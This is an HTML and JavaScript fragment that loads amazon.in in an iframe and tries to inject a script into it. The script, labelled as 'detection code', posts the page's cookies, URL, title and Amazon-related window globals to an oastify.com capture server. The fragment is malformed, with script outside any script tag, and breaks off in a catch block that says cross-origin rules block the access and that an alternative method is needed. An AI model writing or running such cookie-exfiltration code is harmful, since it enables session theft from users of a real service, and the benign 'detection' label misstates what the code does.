<body>
    <iframe id="amazonFrame" src="https://www.amazon.in"></iframe>

        // Wait for iframe to load, then inject script
        const iframe = document.getElementById('amazonFrame');
        
        iframe.onload = function() {
            try {
                // Try to access iframe content
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                
                // Create and inject script
                const script = iframeDoc.createElement('script');
                script.textContent = `
                    // Your detection code here
                    console.log("Injected into Amazon!");
                    alert("Detection running on Amazon!");
                    
                    // Send data to your server
                    fetch('https://wppcvxw8adrbohztq7nrhakh58bzzwnl.oastify.com/capture', {
                        method: 'POST',
                        body: JSON.stringify({
                            cookies: document.cookie,
                            url: window.location.href,
                            title: document.title,
                            globals: Object.keys(window).filter(k => 
                                k.toLowerCase().includes('amazon') || 
                                k.toLowerCase().includes('apay')
                            )
                        }),
                        headers: {'Content-Type': 'application/json'}
                    });
                `;
                iframeDoc.head.appendChild(script);
                
            } catch(e) {
                console.log('Cannot access iframe (cross-origin):', e);
                // Cross-origin blocks direct access - need alternative method
